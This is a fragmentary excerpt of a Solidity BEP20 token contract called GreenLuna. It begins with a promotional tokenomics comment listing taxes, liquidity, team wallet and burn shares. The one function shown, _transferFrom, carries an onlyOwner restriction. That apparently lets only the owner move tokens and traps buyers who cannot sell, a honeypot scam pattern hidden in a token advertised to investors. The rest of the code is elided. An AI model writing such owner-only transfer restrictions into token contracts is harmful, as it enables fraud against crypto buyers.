...
Tokenomics:
💰 3% Buy & Sell Tax
🤑 47% Liquidity Pancake
👩🏻‍🚀 3% Team wallet
🔥 50% burned 

🔥 DISCLAIMER ON AND DYOR 🔥
*/
...
contract GreenLuna is IBEP20, Auth {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal onlyOwner returns  (bool) {
